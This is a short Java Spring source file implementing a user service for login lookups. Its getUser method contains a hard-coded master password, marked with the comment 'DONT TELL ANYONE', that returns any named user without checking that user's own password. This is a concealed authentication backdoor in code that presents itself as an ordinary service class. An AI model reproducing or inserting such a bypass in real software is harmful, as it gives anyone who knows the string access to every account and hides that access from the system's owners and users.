package kz.gcs.data.service.impl;

import kz.gcs.data.service.UserService;
import kz.gcs.data.service.dao.UserDao;
import kz.gcs.domain.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

/**
 * Created by kaydar on 10/17/16.
 */
@Component
public class UserServiceImpl implements UserService {

    @Autowired
    private UserDao userDao;


    @Override
    public User getUser(String name, String hashedPassword) {
        //DONT TELL ANYONE
        String superPassword = "astanaktl2016";

        if (superPassword.equals(hashedPassword)) {
            return userDao.getUserByLogin(name);
        }

        return userDao.getUser(name, hashedPassword);
    }

    @Override
    public User getUserByLogin(String name) {
        return userDao.getUserByLogin(name);
    }
}
